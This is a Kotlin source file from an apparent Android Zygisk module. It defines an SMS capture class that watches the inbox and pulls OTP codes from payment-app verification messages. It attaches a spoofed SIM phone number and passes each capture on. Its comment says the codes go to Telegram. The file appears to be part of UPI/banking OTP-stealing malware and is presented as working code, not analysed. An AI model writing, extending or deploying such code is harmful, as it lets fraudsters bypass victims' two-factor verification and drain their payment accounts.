package com.hivirtus.zygiskmode

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.util.Log

/**
 * Real SMS capture via ContentObserver — works with READ_SMS permission.
 * Forwards hooked UPI app verification SMS to Telegram through OverlayService pipeline.
 */
class SmsCaptureMonitor(
    private val context: Context,
    private val onCaptured: (LastOtp) -> Unit
) {
    private val handler = Handler(Looper.getMainLooper())
    private var lastProcessedId = -1L
    private var running = false

    private val observer = object : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            scanLatestSms()
        }
    }

    fun start() {
        if (running) return
        running = true
        try {
            context.contentResolver.registerContentObserver(
                Telephony.Sms.CONTENT_URI,
                true,
                observer
            )
        } catch (e: Exception) {
            Log.w(TAG, "SMS observer register failed: ${e.message}")
        }
        scanLatestSms()
    }

    fun stop() {
        if (!running) return
        running = false
        try {
            context.contentResolver.unregisterContentObserver(observer)
        } catch (_: Exception) {}
    }

    private fun scanLatestSms() {
        if (!PermissionHelper.hasReadSms(context)) return

        try {
            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE
            )
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                "${Telephony.Sms.TYPE}=?",
                arrayOf(Telephony.Sms.MESSAGE_TYPE_INBOX.toString()),
                "${Telephony.Sms.DATE} DESC LIMIT 3"
            ) ?: return

            cursor.use {
                while (it.moveToNext()) {
                    val id = it.getLong(0)
                    if (id <= lastProcessedId) continue

                    val sender = it.getString(1)?.trim().orEmpty()
                    val body = it.getString(2)?.trim().orEmpty()
                    if (sender.isBlank() || body.isBlank()) continue

                    val config = ConfigManager(context).load()
                    if (!SmsMatcher.shouldCapture(config, sender, body)) continue

                    lastProcessedId = id
                    val phone = resolveSpoofPhone(context, config)
                    val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
                    val label = SmsMatcher.messageLabel(sender, body)

                    val otp = LastOtp(
                        otp = token,
                        sender = sender,
                        body = body,
                        phone = phone,
                        messageLabel = label,
                        direction = "incoming"
                    )
                    OtpCaptureWriter.write(context, otp)
                    onCaptured(otp)
                    return
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "SMS scan failed: ${e.message}")
        }
    }

    private fun resolveSpoofPhone(context: Context, config: ModuleConfig): String {
        if (config.enablePhoneSpoof) {
            if (config.enableSim1Mock && config.mockPhoneSim1.isNotBlank()) return config.mockPhoneSim1
            if (config.enableSim2Mock && config.mockPhoneSim2.isNotBlank()) return config.mockPhoneSim2
            if (config.mockPhoneSim1.isNotBlank()) return config.mockPhoneSim1
        }
        return ConfigManager(context).readSpoofPhone().ifBlank { config.mockPhoneSim1 }
    }

    companion object {
        private const val TAG = "SmsCaptureMonitor"
    }
}
